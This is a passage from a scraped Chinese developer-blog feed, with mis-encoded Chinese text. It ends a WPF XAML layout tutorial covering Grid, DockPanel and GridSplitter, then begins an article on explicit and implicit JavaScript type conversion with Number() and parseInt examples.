    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">DockPanel</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Grid.ColumnSpan</span>=<span class="hljs-string">"2"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#126a74"</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"60"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"wpfåº”ç”¨ç¨‹åºå¸ƒå±€ç¨‹åº"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"15,15"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">StackPanel</span> <span class="hljs-attr">Orientation</span>=<span class="hljs-string">"Horizontal"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Right"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"35"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">BorderThickness</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">BorderBrush</span>=<span class="hljs-string">"#ca5100"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#ca5100"</span> <span class="hljs-attr">CornerRadius</span>=<span class="hljs-string">"10"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"é€€å‡ºç³»ç»Ÿ"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">VerticalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">StackPanel</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">DockPanel</span>&gt;</span></span>
    &lt;!--left--&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">StackPanel</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Width</span>=<span class="hljs-string">"350"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"250"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#439d84"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"å‚æ•°åŒºåŸŸ"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">VerticalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"15"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"250"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#439d84"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"å‚æ•°åŒºåŸŸ"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">VerticalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"15"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"110"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#439d84"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"å‚æ•°åŒºåŸŸ"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">VerticalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"15"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">StackPanel</span>&gt;</span></span>

    &lt;!--right--&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"1"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">BorderThickness</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">BorderBrush</span>=<span class="hljs-string">"#f7bd93"</span> <span class="hljs-attr">CornerRadius</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"#fdd2d2"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"ä¸»ä½“åŒºåŸŸ"</span> <span class="hljs-attr">Margin</span>=<span class="hljs-string">"5"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Width</span>=<span class="hljs-string">"150"</span> <span class="hljs-attr">Height</span>=<span class="hljs-string">"150"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">BorderThickness</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"red"</span> <span class="hljs-attr">BorderBrush</span>=<span class="hljs-string">"Gray"</span> <span class="hljs-attr">CornerRadius</span>=<span class="hljs-string">"75"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"å¼€å§‹è¿è¡Œ"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">VerticalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"20"</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Grid</span>&gt;</span></span>

    &lt;!--<span class="hljs-title class_">Bottom</span>--&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid</span> <span class="hljs-attr">Grid.Row</span>=<span class="hljs-string">"2"</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Grid.ColumnSpan</span>=<span class="hljs-string">"2"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"Orange"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"ç‰ˆæœ¬å· 1.2658.24546 ç‰ˆæƒæ‰€æœ‰ï¼š"</span> <span class="hljs-attr">Foreground</span>=<span class="hljs-string">"White"</span> <span class="hljs-attr">FontSize</span>=<span class="hljs-string">"14"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Grid</span>&gt;</span></span>

&lt;/<span class="hljs-title class_">Grid</span>&gt;
</code></pre>
<h2 data-id="heading-12">GridSplitteråˆ†å‰²çª—å£_</h2>
<ul>
<li>
<p>åŠŸèƒ½ç‰¹æ€§ï¼šå¯å°†åŒºåŸŸåˆ†æˆä¸¤éƒ¨åˆ†å¹¶é€šè¿‡é¼ æ ‡æ‹–åŠ¨è°ƒæ•´åŒºåŸŸå¤§å°</p>
</li>
<li>
<p>äº¤äº’æ–¹å¼ï¼šé¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºåŒå‘ç®­å¤´å…‰æ ‡ï¼ŒæŒ‰ä½æ‹–åŠ¨å¯å®æ—¶è°ƒæ•´åˆ†å‰²æ¯”ä¾‹</p>
</li>
<li>
<p>åŸºç¡€ç»“æ„ï¼šéœ€è¦å…ˆåˆ›å»ºåŒ…å«å¤šåˆ—çš„Gridå¸ƒå±€</p>
</li>
<li>
<p>å…³é”®è®¾ç½®ï¼š</p>
<ul>
<li>ä¸­é—´åˆ—å®½åº¦è®¾ä¸º"Auto"ï¼ˆWidth="Auto"ï¼‰</li>
<li>ä¸¤ä¾§åˆ—é‡‡ç”¨é»˜è®¤æˆ–å›ºå®šå®½åº¦</li>
</ul>
</li>
<li>
<p>æ³¨æ„äº‹é¡¹ï¼šæœªæ”¾ç½®æ§ä»¶æ—¶Autoåˆ—ä¼šéšè—</p>
</li>
<li>
<p>äº¤äº’åé¦ˆï¼šé¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºåŒå‘ç®­å¤´å…‰æ ‡</p>
</li>
<li>
<p>åŠ¨æ€è°ƒæ•´ï¼šæ‹–åŠ¨æ—¶å¯å®æ—¶æ”¹å˜ä¸¤ä¾§åŒºåŸŸå®½åº¦æ¯”ä¾‹</p>
</li>
<li>
<p>åº”ç”¨ä»·å€¼ï¼šé€‚ç”¨äºéœ€è¦çµæ´»è°ƒæ•´å¸ƒå±€æ¯”ä¾‹çš„åœºæ™¯ï¼ˆå¦‚IDEé¢æ¿ã€æ–‡ä»¶ç®¡ç†å™¨ç­‰ï¼‰</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92c96e2b8e404fd3aaa86f2f08bc5e23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdW5kZWZpbmVk5Zyo5o6Y6YeRMzkwNDE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769006256&amp;x-signature=M33P%2FFKIyJDXNfJW4HDyW7f8AX4%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js"> &lt;<span class="hljs-title class_">Grid</span>&gt;
     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span>/&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span> <span class="hljs-attr">Width</span>=<span class="hljs-string">"auto"</span>/&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">ColumnDefinition</span>/&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">Grid.ColumnDefinitions</span>&gt;</span></span>

     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">Background</span>=<span class="hljs-string">"LightBlue"</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">TextWrapping</span>=<span class="hljs-string">"Wrap"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">LineHeight</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"è€å®äº¤ä»£è‹¦ä¸ŠåŠ è‹¦ç¦»å¼€æ—¶é—´æ®µå’–å•¡æœºæ¥ä¸Šè¯¾å¤§å§å¤«ç«‹å¡è§è¯†åˆ°äº†å’–å•¡æœºçŒæ€å¯¹å†³é¥­å¡ä¸Šç”µåŠ›ç§‘æŠ€é˜¿è¨è¾¾æ¿€å‘æ‹‰å¡å—æ‰“å‡»ç«‹å¡ç¦»å¼€å®¶å¡ç»“ç®—å•å¯æ¥å—çš„å‘ç”Ÿäº†è‚¯å¾·åŸºå›°äº†å°±ç¡åœ°æ–¹"</span>/&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span></span>

     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">GridSplitter</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">Width</span>=<span class="hljs-string">"5"</span> <span class="hljs-attr">HorizontalAlignment</span>=<span class="hljs-string">"Center"</span> <span class="hljs-attr">ShowsPreview</span>=<span class="hljs-string">"False"</span>/&gt;</span></span>
     <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Border</span> <span class="hljs-attr">Grid.Column</span>=<span class="hljs-string">"2"</span>  <span class="hljs-attr">Background</span>=<span class="hljs-string">"LightCoral"</span>&gt;</span>
         <span class="hljs-tag">&lt;<span class="hljs-name">TextBlock</span> <span class="hljs-attr">TextWrapping</span>=<span class="hljs-string">"Wrap"</span> <span class="hljs-attr">Padding</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">LineHeight</span>=<span class="hljs-string">"20"</span> <span class="hljs-attr">Text</span>=<span class="hljs-string">"è€å®äº¤ä»£è‹¦ä¸ŠåŠ è‹¦ç¦»å¼€æ—¶é—´æ®µå’–å•¡æœºæ¥ä¸Šè¯¾å¤§å§å¤«ç«‹å¡è§è¯†åˆ°äº†å’–å•¡æœºçŒæ€å¯¹å†³é¥­å¡ä¸Šç”µåŠ›ç§‘æŠ€é˜¿è¨è¾¾æ¿€å‘æ‹‰å¡å—æ‰“å‡»ç«‹å¡ç¦»å¼€å®¶å¡ç»“ç®—å•å¯æ¥å—çš„å‘ç”Ÿäº†è‚¯å¾·åŸºå›°äº†å°±ç¡åœ°æ–¹"</span>/&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">Border</span>&gt;</span></span>
 &lt;/<span class="hljs-title class_">Grid</span>&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡ææ‡‚ JavaScript æ•°æ®ç±»å‹è½¬æ¢ï¼ˆæ˜¾å¼ & éšå¼å…¨è§£æï¼‰]]></title>    <link>https://juejin.cn/post/7594854295759487019</link>    <guid>https://juejin.cn/post/7594854295759487019</guid>    <pubDate>2026-01-14T14:41:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594854295759487019" data-draft-id="7593342203823276038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡ææ‡‚ JavaScript æ•°æ®ç±»å‹è½¬æ¢ï¼ˆæ˜¾å¼ &amp; éšå¼å…¨è§£æï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-14T14:41:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="zhEng"/> <meta itemprop="url" content="https://juejin.cn/user/4398498737560861"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡ææ‡‚ JavaScript æ•°æ®ç±»å‹è½¬æ¢ï¼ˆæ˜¾å¼ &amp; éšå¼å…¨è§£æï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4398498737560861/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    zhEng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:41:54.000Z" title="Wed Jan 14 2026 14:41:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€ä¸ºä»€ä¹ˆ JS ä¼šæœ‰æ•°æ®ç±»å‹è½¬æ¢ï¼Ÿ</h2>
<p>å…ˆä»ä¸€ä¸ªæœ€æœ¬è´¨çš„ç‰¹ç‚¹è¯´èµ· ğŸ‘‡</p>
<h3 data-id="heading-1">(1) JavaScript æ˜¯ä¸€é—¨ã€ŒåŠ¨æ€ç±»å‹è¯­è¨€ã€</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>;
i = <span class="hljs-string">"zhangsan"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);
</code></pre>
<p>åœ¨ JS ä¸­ï¼š</p>
<ul>
<li>å˜é‡<strong>æ²¡æœ‰å›ºå®šç±»å‹</strong></li>
<li>ç±»å‹æ˜¯åœ¨<strong>è¿è¡Œæ—¶æ‰ç¡®å®šçš„</strong></li>
</ul>
<p>è¿™å’Œ Java / TypeScript å®Œå…¨ä¸åŒã€‚</p>
<h3 data-id="heading-2">(2) è¿ç®—ç¬¦ã€Œæœ‰ç±»å‹é¢„æœŸã€</h3>
<p>è™½ç„¶å˜é‡æ²¡æœ‰ç±»å‹ï¼Œä½†<strong>è¿ç®—ç¬¦æ˜¯æœ‰è¦æ±‚çš„</strong>ã€‚è™½ç„¶æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸å‡ï¼Œä½†æ˜¯ä¾ç„¶å¾—åˆ°æ•°å€¼Â <code>1</code>ï¼ŒåŸå› å°±åœ¨äºÂ <em>JavaScript</em>Â å°†è¿ç®—å­è‡ªåŠ¨è½¬ä¸ºäº†æ•°å€¼ã€‚</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥å°±æ¥çœ‹ä¸€ä¸‹Â <em>JavaScript</em>Â ä¸­å¦‚ä½•è¿›è¡Œæ•°æ®ç±»å‹è½¬æ¢ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">'4'</span> - <span class="hljs-string">'3'</span> <span class="hljs-comment">// 1</span>
</code></pre>
<p>å‡æ³•è¿ç®—ç¬¦æœŸæœ›çš„æ˜¯ã€Œæ•°å­—ã€ï¼Œäºæ˜¯ JS ä¼šåœ¨èƒŒåå·å·åšä¸€ä»¶äº‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-string">'4'</span> â†’ <span class="hljs-number">4</span>
<span class="hljs-string">'3'</span> â†’ <span class="hljs-number">3</span>
</code></pre>
<p><strong>è¿™å°±æ˜¯æ•°æ®ç±»å‹è½¬æ¢å­˜åœ¨çš„æ ¹æœ¬åŸå› </strong></p>
<hr/>
<h2 data-id="heading-3">2ã€æ˜¾å¼è½¬æ¢ï¼ˆä½ è‡ªå·±åŠ¨æ‰‹ï¼‰</h2>
<p>å¼ºåˆ¶è½¬æ¢ä¸»è¦æŒ‡ä½¿ç”¨<code>Number()</code>ã€<code>String()</code>å’Œ<code>Boolean()</code>ä¸‰ä¸ªå‡½æ•°ï¼Œæ‰‹åŠ¨å°†å„ç§ç±»å‹çš„å€¼ï¼Œåˆ†åˆ«è½¬æ¢æˆæ•°å­—ã€å­—ç¬¦ä¸²æˆ–è€…å¸ƒå°”å€¼ã€‚</p>
<h3 data-id="heading-4">2.1 Number()ï¼šæŠŠä¸€åˆ‡å˜æˆæ•°å­—</h3>
<h4 data-id="heading-5">ï¼ˆ1ï¼‰åŸå§‹ç±»å‹</h4>
<p>åŸå§‹ç±»å‹å€¼çš„è½¬æ¢è§„åˆ™å¦‚ä¸‹:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Number</span>(<span class="hljs-string">''</span>)        <span class="hljs-comment">// 0</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">'123'</span>)     <span class="hljs-comment">// 123</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">'zhangsan'</span>)  <span class="hljs-comment">// NaN</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">'123?'</span>)    <span class="hljs-comment">// NaN</span>

<span class="hljs-title class_">Number</span>(<span class="hljs-literal">true</span>)      <span class="hljs-comment">// 1</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">false</span>)     <span class="hljs-comment">// 0</span>

<span class="hljs-title class_">Number</span>(<span class="hljs-literal">undefined</span>) <span class="hljs-comment">// NaN</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-literal">null</span>)      <span class="hljs-comment">// 0</span>
</code></pre>
<p>âš ï¸ æ³¨æ„ï¼š<code>Number()</code> <strong>éå¸¸ä¸¥æ ¼</strong>ï¼Œ <code>parseInt</code>èƒ½è½¬å¤šå°‘è½¬å¤šå°‘ï¼Œ<code>Number</code>ä¸çº¯å°±ç›´æ¥ NaN</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">parseInt</span>(<span class="hljs-string">'123abc'</span>) <span class="hljs-comment">// 123</span>
<span class="hljs-title class_">Number</span>(<span class="hljs-string">'123abc'</span>)   <span class="hljs-comment">// NaN</span>
</code></pre>
<h4 data-id="heading-6">ï¼ˆ2ï¼‰å¯¹è±¡è½¬æ¢è§„åˆ™ï¼ˆé‡ç‚¹ï¼‰</h4>
<p>ç®€å•çš„è§„åˆ™æ˜¯ï¼Œ<code>Number</code>æ–¹æ³•çš„å‚æ•°æ˜¯å¯¹è±¡æ—¶ï¼Œå°†è¿”å›<code>NaN</code>ï¼Œé™¤éæ˜¯åŒ…å«å•ä¸ªæ•°å€¼çš„æ•°ç»„ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Number</span>({<span class="hljs-attr">n</span>: <span class="hljs-number">1</span>}) <span class="hljs-comment">// NaN</span>
<span class="hljs-title class_">Number</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]) <span class="hljs-comment">// NaN</span>
<span class="hljs-title class_">Number</span>([<span class="hljs-number">6</span>]) <span class="hljs-comment">// 6</span>
</code></pre>
<p>å†…éƒ¨å…¶å®èµ°äº†<strong>ä¸‰æ­¥è§„åˆ™</strong>ï¼š</p>
<ol>
<li>å…ˆè°ƒç”¨å¯¹è±¡è‡ªèº«çš„ <code>valueOf()</code>æ–¹æ³•ã€‚å¦‚æœè¿”å›åŸå§‹ç±»å‹çš„å€¼ï¼Œåˆ™ç›´æ¥å¯¹è¯¥å€¼ä½¿ç”¨<code>Number</code>å‡½æ•°,ä¸åœ¨è¿›è¡Œåç»­æ“ä½œã€‚</li>
